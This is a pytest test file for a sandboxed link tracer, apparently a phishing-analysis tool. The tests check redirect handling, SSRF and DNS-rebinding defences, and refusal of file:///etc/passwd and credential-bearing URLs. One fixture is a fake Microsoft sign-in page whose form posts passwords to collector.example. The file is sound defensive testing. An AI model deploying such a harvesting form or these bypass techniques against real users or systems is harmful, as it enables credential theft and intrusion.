
from unhook_sandbox import guard, tracer
from unhook_sandbox.config import Config

LOGIN = """<html><head><title>  Sign in
  to Microsoft </title></head><body><script>var secret=1</script>
<form action="https://collector.example/post" method="post"><input name=u><input type="PASSWORD" name=p></form>
<p>Enter your password to continue</p></body></html>"""


def test_follows_redirects_and_reads_the_landing_page(site, lab):
    site.redirect("/a", site.url("/b")).redirect("/b", "/c", 301).add("/c", LOGIN)
    r = tracer.trace(site.url("/a"), lab)
    assert [h["status"] for h in r["hops"]] == [302, 301, 200]
    assert r["final_url"].endswith("/c") and r["final_host"] == "127.0.0.1"
    assert r["title"] == "Sign in to Microsoft"
    assert r["password_form"] is True and r["form_hosts"] == ["collector.example"]
    assert "Enter your password" in r["text_excerpt"] and "secret" not in r["text_excerpt"]
    assert r["error"] == "" and r["mode"] == "http"


def test_meta_refresh_counts_as_a_hop(site, lab):
    site.add("/start", '<meta http-equiv="Refresh" content="0; url=/landing"><title>wait</title>').add("/landing", "<title>Landed</title>")
    r = tracer.trace(site.url("/start"), lab)
    assert [h["note"] for h in r["hops"]] == ["meta refresh", ""]
    assert r["title"] == "Landed"


def test_a_redirect_loop_stops_and_says_so(site, lab):
    site.redirect("/x", site.url("/y")).redirect("/y", site.url("/x"))
    lab.max_hops = 4
    r = tracer.trace(site.url("/x"), lab)
    assert len(r["hops"]) == 5 and "redirects" in r["error"]


def test_loopback_is_refused_by_default_and_never_contacted(site):
    site.add("/", LOGIN)
    cfg = Config(ports=frozenset({site.port}))  # allow_private stays off
    r = tracer.trace(site.url("/"), cfg)
    assert r["error"].startswith("refused") and r["hops"][0]["status"] is None
    assert site.hits == []


def test_a_redirect_into_a_private_address_is_refused_before_connecting(monkeypatch, site, other_site, lab):
    # Pretend only 127.0.0.1 is "public"; 127.0.0.2 stands in for the internal network.
    monkeypatch.setattr(guard, "ip_allowed", lambda addr, allow_private=False: addr == "127.0.0.1")
    other_site.add("/secret", "internal admin panel")
    site.redirect("/bounce", other_site.url("/secret"))
    r = tracer.trace(site.url("/bounce"), lab)
    assert other_site.hits == []
    assert r["error"].startswith("refused") and "non-public" in r["error"]
    assert [h["status"] for h in r["hops"]] == [302, None]


def test_we_connect_to_the_address_we_vetted_not_whatever_dns_says_next(monkeypatch, site, lab):
    calls = []
    real = guard.socket.getaddrinfo

    def rebinding(host, port, *a, **k):
        if host != "rebind.test":
            return real(host, port, *a, **k)
        calls.append(host)
        answer = "127.0.0.1" if len(calls) == 1 else "127.0.0.2"  # the second answer would be the attack
        return [(guard.socket.AF_INET, 1, 6, "", (answer, port))]

    monkeypatch.setattr(guard.socket, "getaddrinfo", rebinding)
    site.add("/", "<title>fine</title>")
    r = tracer.trace(f"http://rebind.test:{site.port}/", lab)
    assert r["title"] == "fine" and len(calls) == 1
    assert site.hits == [("/", f"rebind.test:{site.port}")]  # right server, and the Host header is the real name


def test_credentials_and_odd_schemes_are_refused(lab):
    assert tracer.trace("http://user:pw@127.0.0.1/", lab)["error"].startswith("refused")
    assert tracer.trace("file:///etc/passwd", lab)["error"].startswith("refused")


def test_non_text_responses_are_not_read(site, lab):
    site.add("/payload", b"MZ" + b"\x00" * 5000, **{"Content-Type": "application/octet-stream"})
    r = tracer.trace(site.url("/payload"), lab)
    assert r["hops"][0]["note"].startswith("not read") and r["title"] == "" and r["error"] == ""


def test_huge_pages_are_capped(site, lab):
    lab.max_body = 4096
    site.add("/big", "<title>Top</title>" + "<p>filler</p>" * 200_000)
    r = tracer.trace(site.url("/big"), lab)
    assert r["title"] == "Top" and r["error"] == ""


def test_a_dead_port_is_reported_not_raised(site, lab):
    site.close()
    r = tracer.trace(site.url("/"), lab)
    assert r["error"].startswith("connection failed")


def test_result_matches_what_the_backend_client_expects(site, lab):
    site.add("/", "<title>x</title>")
    r = tracer.trace(site.url("/"), lab)
    assert set(r) >= {"hops", "final_url", "final_host", "title", "text_excerpt", "password_form", "form_hosts", "error", "mode"}
